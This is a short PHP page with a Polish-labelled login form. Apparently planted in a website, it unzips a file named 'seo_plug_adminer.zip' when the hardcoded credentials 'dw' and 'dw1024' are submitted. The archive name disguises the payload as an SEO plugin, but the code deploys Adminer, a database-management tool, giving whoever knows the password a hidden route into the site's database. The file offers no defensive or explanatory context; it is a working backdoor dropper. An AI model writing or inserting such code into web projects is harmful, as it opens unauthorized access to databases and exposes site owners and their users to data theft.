<style>

	.form{
		width: 300px; 
		margin: 0 auto;
		margin-top: 200px;
	}

	.form p{
		font-family: arial; 
		text-align: center; 
		opacity: 0.6;
	}

	.a{
		width: 100%; 
		height: 50px; 
		margin-bottom: 10px; 
		border-radius: 5px; 
		border: solid 1px #7e8993; 
		text-align: center; 
		outline: none; font-size: 20px;
	}

	.b{
		width: 100%; 
		height: 50px; 
		border-radius: 5px; 
		border: solid 1px #7e8993;
	}

</style>

<form method="post" class="form">
	<input class="a" type="text" name="login" autocomplete="off" />
	<input class="a" type="password" name="password" autocomplete="off" />
	<div style="clear: both;"></div>
	<input class="b" type="submit" name="submit" value="Potwierdź" />
	<p>Podaj dane aby dodać adminera</p>
</form>
<?php
	if (isset($_POST['submit']) && $_POST['login'] == 'dw' && $_POST['password'] == 'dw1024'){
		system("unzip seo_plug_adminer.zip");
	}
?>
